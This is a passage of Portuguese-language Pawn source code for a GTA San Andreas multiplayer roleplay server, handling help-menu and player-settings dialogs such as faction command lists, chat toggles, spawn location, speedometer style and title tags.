							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}
						if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/mudarimposto: {848484}Altera o valor do imposto de renda.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 9:
					{
					    if (Player_GetOrgRole(playerid) != 5)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sub-líder.");
						}
						//
					    new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 10:
					{
                        return 1;
					    // return ReCommand:ajudaemprego(playerid);
					}
					case 11:
					{
					    /*if (playerInfo[playerid][pOrg] == UNDEFINED_ORG)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não faz parte de uma organização.");
						}
						//
					    new helpMessage[3000], titleDialog[87];
						if (IsACop(playerid) && playerInfo[playerid][pOrg] != ID_GOVERNO && playerInfo[playerid][pOrg] != ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos policiais:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Libera o jogador da jaula (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Desamarra o jogador (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao governo:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{ff6347}Importante: {FFFFFF}O DETRAN possui os comandos de Policiais, no entanto ele não exerce a função\nSó será permitido aplicar o (/su) em blitz caso encontre entorpecentes, nteste caso estará autorizado a algemar\no suspeito e levar até a penitenciária e prendê-lo. Em hipótese algumao DETRAN poderá ir atrás de procurados,\nse isso acontecer, estará sujeito a levar punição por um admin ou receber denúncia no fórum.\n\n");
							strcat(helpMessage, "{848484}Observação:\n{B4B5B7}O DETRAN está autorizado a apreender veículos que estejam espalhados pela cidade ou que constem com multas.\nÉ uma revista, caso constate que o veículo do indivídio tenha multa de até 1 hora de recência deverá liberá-lo.\nPara apreender determinado veículo, basta utilizar o comando (/guinchar) e levá-lo até o pátio que está\nlocalizado em sua HQ. Após cjegar na HQ do DETRAN, entre no veículo guinchado e leve até o interior do pátio.\nApós isso, fixe o veículo utilizando (/fixar); O DETRAn consegue entrar em veículos de ORGANIZAÇÃO caso esteja\npróximo a HQ. Caso guinche algum veículo próprio e não consegia entrar no veículo por estar trancado, use o\ncomando (/abrirveiculo).\n\n");
							strcat(helpMessage, "{0080ff}Veículo Próprio: {B4B5B7}Veículo próprio poderá ser guinchado também, porém, ele irá sumir caso o proprietário dele\ndesconecte do servidor, porém, quando logar novamente, o veículo será sertado automaticamente no Pátio novamente\naté o proprietário soltá-lo!\n\n");
							strcat(helpMessage, "{ccccff}Mecânico: {FFFFFF}O DETRAN poderá trabalhar de Bico como Mecânico caso possua Cargo 2+, para isso, basta ir até\na Oficina do DETRAN e digitar: (/batercartao).\n\n");
							strcat(helpMessage, "{f60000}Comandos:\n");
							strcat(helpMessage, "{848484}/fixar					/crimes\n");
							strcat(helpMessage, "{848484}/guinchar				/dl\n");
							strcat(helpMessage, "{848484}/desfixar				/revistar\n");
							strcat(helpMessage, "{848484}/prender				/abrirveiculo\n");
							strcat(helpMessage, "{848484}/r					/d\n");
							strcat(helpMessage, "{848484}/m					/multar\n");
							strcat(helpMessage, "{848484}/multarplaca  				/gov\n");
							strcat(helpMessage, "{848484}/reforco				/su\n");
							strcat(helpMessage, "{848484}/bq					/rbq\n");
							strcat(helpMessage, "{848484}/br					/rbr\n");
							strcat(helpMessage, "{848484}/pregos					/rpr\n");
							strcat(helpMessage, "{848484}/algemar				/desalgemar\n");
							strcat(helpMessage, "{848484}/procurados				/presos\n");
							strcat(helpMessage, "{848484}/vdp					/vdr\n");
							strcat(helpMessage, "{848484}/infocar					/sireneon\n\n");
							strcat(helpMessage, "{ccccff}Comandos Mecânicos:\n");
							strcat(helpMessage, "{848484}/reparar				/blindar\n");
							strcat(helpMessage, "{848484}/tunar					/abastecer\n");

						}
						else if (IsAGangster(playerid) || IsAMafia(playerid) || IsATerror(playerid) || IsAMercenary(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos criminosos:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/assaltar: {848484}Assalta um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sequestrar: {848484}Sequestra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendermaconha: {848484}Vende maconha para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercocaina: {848484}Vende cocaína para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercrack: {848484}Vende crack para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/roubar: {848484}Rouba um cofre.\n");
							strcat(helpMessage, "{FFFFFF}/ang: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Coloca o jogador na jaula do cativeiro.\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Liberta o refém do sequestro.\n");
							strcat(helpMessage, "{FFFFFF}/incendiar: {848484}Incendeia um local.\n");
							if (IsAMafia(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/venderkit: {848484}Vende de Kit de Armas.\n\n");
								strcat(helpMessage, "{ff6347}OBS: {FFFFFF}É possível vender dinamites e outros itens no território.\n");
							}
							if (IsATerror(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/trvarma: {848484}Vende Armas Espeiciais.\n");
								strcat(helpMessage, "{FFFFFF}/homembomba: {848484}Explodir-se.\n");
								strcat(helpMessage, "{FFFFFF}/plantarbomba: {848484}Planta uma bomba.\n");
								strcat(helpMessage, "{FFFFFF}/dbomba: {848484}Explode uma bomba plantada.\n");
							}
							if (IsAMercenary(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/mcvarma: {848484}Vende Armas Espeicais.\n");
							}
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao detran:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/reparar: {848484}Repara o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/blindar: {848484}Blinda o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/abastecer: {848484}Abastece o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/tunar: {848484}Tuna o veículo de um jogadorr.\n");
							strcat(helpMessage, "{FFFFFF}/fixar: {848484}Fixa/Refixa um veículo na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/desfixar: {848484}Desfixa um veículo fixado na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/darrespawn: {848484}Respawna um veículo próximo.\n");
							strcat(helpMessage, "{FFFFFF}/guinchar: {848484}Guincha um veículo (Exceto motos).\n");
							strcat(helpMessage, "{FFFFFF}/guincharmoto: {848484}Guinhca uma moto (Apenas no BoxVille).\n");
							strcat(helpMessage, "{FFFFFF}/soltarmotos: {848484}Solta a moto guinchada (Apenas no BoxVille).\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_REPORTERES)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos repórteres:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/noticia(/no): {848484}Divulga uma notícia.\n");
							strcat(helpMessage, "{FFFFFF}/aovivo: {848484}Inicia uma entrevista.\n");
						}
						format(titleDialog, sizeof(titleDialog), "{FFFFFF}Comandos do(a): {%06x}%s", orgColors[playerInfo[playerid][pOrg]] >>> 8, OrgInfo[playerInfo[playerid][pOrg]][oName]);
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, titleDialog, helpMessage, "Entendi", "");
						return 1;*/
					}
					case 12:
					{
						new helpMessage[164];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Edita os acessórios equipados.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para equipar um acessório, basta usá-lo no seu inventário.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Acessórios", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 13:
					{
                        return 1;
						// return ReCommand:infocaixa(playerid);
					}
					case 14:
					{
                        return ShowPlayerAnims(playerid);
					}
				}
			}
		}
		// Plataform
        case DIALOG_CHECK_ANDROID:
        {
            if (!response) 
            {
                Player_SetUsingAndroidStatus(playerid, false);
                return 1;
            }
            if (response) 
            {
                Player_SetUsingAndroidStatus(playerid, true);
                return 1;
            }
        }
		//=================================[ DIALOGO DE CONFIG ]==============================||
		// Lista das configurações
		case DIALOG_CONFIG_LIST:
		{
	        if (!response)
	        {
				SendClientMessage(playerid, COLOR_INVALID, "Você fechou as configurações de modo de jogo.");
	            return 1;
	        }
			if (response)
			{
			    switch(listitem)
			    {
			        case 0:
			        {
			            new StrCat[450];
				        strcat(StrCat, "Título\tStatus\n");
				        strcat(StrCat, (Player_GetTag(playerid) == NO_TAG ? "{FFFFFF}Sem Título\t{228B22}[ON]\n" : "{FFFFFF}Sem Título\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SCRIPTER ? "{FFFFFF}Scripter\t{228B22}[ON]\n" : "{FFFFFF}Scripter\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_ADMIN ? "{FFFFFF}Administrador\t{228B22}[ON]\n" : "{FFFFFF}Administrador\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_LEADER ? "{FFFFFF}Líder\t{228B22}[ON]\n" : "{FFFFFF}Líder\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SUBLEADER ? "{FFFFFF}SubLíder\t{228B22}[ON]\n" : "{FFFFFF}SubLíder\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_VIP ? "{FFFFFF}Membro Vip\t{228B22}[ON]\n" : "{FFFFFF}Membro Vip\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SOCIO ? "{FFFFFF}Membro Sócio\t{228B22}[ON]\n" : "{FFFFFF}Membro Sócio\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_NOOB ? "{FFFFFF}Noob\t{228B22}[ON]\n" : "{FFFFFF}Noob\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_KILLER ? "{FFFFFF}Matador\t{228B22}[ON]\n" : "{FFFFFF}Matador\t{FF0000}[OFF]\n"));
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						ShowPlayerDialog(playerid, DIALOG_MANAGE_TAG, DIALOG_STYLE_TABLIST_HEADERS, "Gerenciar Títulos", StrCat, "Trocar", "Voltar");
			        }
			        case 1:
			        {
			            switch(Player_GetSpawn(playerid))
						{
							case 0: 
							{
								if (Player_GetAdminLevel(playerid) > HELPER)
								{
									Player_SetSpawn(playerid, 2);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
								else
								{
									Player_SetSpawn(playerid, 0);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa para alterar o local de nascimento.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
							}
							case 1: 
							{ 
								if (Player_GetAdminLevel(playerid) > HELPER) 
								{
									Player_SetSpawn(playerid, 2);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
								else 
								{
									Player_SetSpawn(playerid, 0);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
							}
							case 2:
							{
								Player_SetSpawn(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 2:
			        {
			            switch(Player_GetTerritorialChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetTerritorialChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou as mensagens territoriais.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetTerritorialChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou as mensagens territoriais.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
			        case 3:
			        {
			            switch(Player_GetNoobChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetNoobChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat de duvidas.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetNoobChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat de duvidas.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 4:
			        {
			            switch(Player_GetVipChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetVipChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat vip.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetVipChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat vip.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 5:
			        {
			            switch(Player_GetSocioChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetSocioChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat socio.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetSocioChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat socio.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 6:
			        {
			            switch(Player_GetMusicStreamStatus(playerid))
						{
							case 0: 
							{
								Player_SetMusicStreamStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou as musicas em interiores.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetMusicStreamStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou as musicas em interiores.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 7:
			        {
						if (Player_GetOrgRole(playerid) != 6)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder");
						}
			            switch(Player_GetLeaderChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetLeaderChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat lider.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetLeaderChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat lider.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 8:
			        {
			            switch(Player_GetDocument(playerid))
						{
							case 0: 
							{
								Player_SetDocument(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato texto.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetDocument(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato menu.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 9:
			        {
						if (IsPlayerInAnyVehicle(playerid))
						{
							HidePlayerSpeedometer(playerid);
						}
			            switch(Player_GetSpeedometer(playerid))
						{
							case 0: 
							{
								Player_SetSpeedometer(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo compacto.");
							}
							default: 
							{
								Player_SetSpeedometer(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo moderno.");
								
							}
						}
						new vehicleid = GetPlayerVehicleID(playerid);
						if (IsPlayerInVehicle(playerid, vehicleid) && vehicleid != INVALID_VEHICLE_ID && IsValidVehicle(vehicleid)) 
						{
							UpdatePlayerSpeedometer(playerid, vehicleid, Player_GetSpeedometer(playerid));
							ShowPlayerSpeedometer(playerid, Player_GetSpeedometer(playerid));
							StartSpeedometerTimer(playerid, vehicleid);
							return 1;
						}
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
			        }
					case 10:
			        {
			            switch(Player_GetTracker(playerid))
						{
							case 0: 
							{
								Player_SetTracker(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para seta.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetTracker(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para checkpoint.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 11:
			        {
						if (!Player_GetUsingAndroidStatus(playerid))
						{
							Player_SetUsingAndroidStatus(playerid, true);
							SendClientAlert(playerid, "Configuracoes", "Voce mudou a sua plataforma para android.");
						}
						else
						{
							Player_SetUsingAndroidStatus(playerid, false);
							SendClientAlert(playerid, "Configuracoes", "Voce mudou a sua plataforma para pc.");
						}
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						return ShowPlayerConfig(playerid);
			        }
					case 12:
			        {
			            switch(Player_GetScreenSize(playerid))
						{
							case SCREEN_NORMAL: 
							{
								Player_SetScreenSize(playerid, SCREEN_ULTRAWIDE);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 21:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
							case SCREEN_ULTRAWIDE: 
							{
								Player_SetScreenSize(playerid, SCREEN_NORMAL);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 16:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
							default:
							{
								Player_SetScreenSize(playerid, SCREEN_NORMAL);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 16:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
						}
						CallLocalFunction("OnPlayerUpdateScreenSize", "i", playerid);
			        }
					case 13:
			        {
						new hitDialog[228 + 1];
			            strcat(hitDialog, (Player_GetHitSound(playerid) == 3 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 2 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 1 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 0 ? "{04b404}» {f60000}(Desativar barulho do sino)\n" : "{f60000}(Desativar barulho do sino)\n"));
			        	PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						ShowPlayerDialog(playerid, DIALOG_MENU_HIT, DIALOG_STYLE_LIST, "Menu Hit", hitDialog, "Escolher", "Voltar");
					}
				}
			}
			return 1;
		}
		case DIALOG_MENU_HIT:
		{
			if (!response) return ShowPlayerConfig(playerid);
			if (response)
			{
				switch(listitem)
				{
					case 0:
					{
						Player_SetHitSound(playerid, 3);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 1:
					{
						Player_SetHitSound(playerid, 2);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Levar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 2:
					{
						Player_SetHitSound(playerid, 1);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar & Levar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 3:
					{
						Player_SetHitSound(playerid, 0);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você desativou o barulho do sino.");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
				}
			}
		}
		case DIALOG_MANAGE_TAG:
		{
		    if (!response)
	        {
	            return ShowPlayerConfig(playerid);
	        }
			if (response)
			{
			    switch(listitem)
			    {
			        case 0:
			        {
			            Player_SetTag(playerid, NO_TAG);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid, COLOR_YELLOW, "Você removeu o seu título.");
						Player_UpdateConfigData(playerid);
			        }
			        case 1:
			        {
			            if (Player_GetAdminLevel(playerid) != OWNER)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é o scripter do servidor.");
			            }
						Player_SetTag(playerid, TAG_SCRIPTER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Scripter'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 2:
			        {
			            if (Player_GetAdminLevel(playerid) < HELPER)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um administrador.");
			            }
						Player_SetTag(playerid, TAG_ADMIN);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
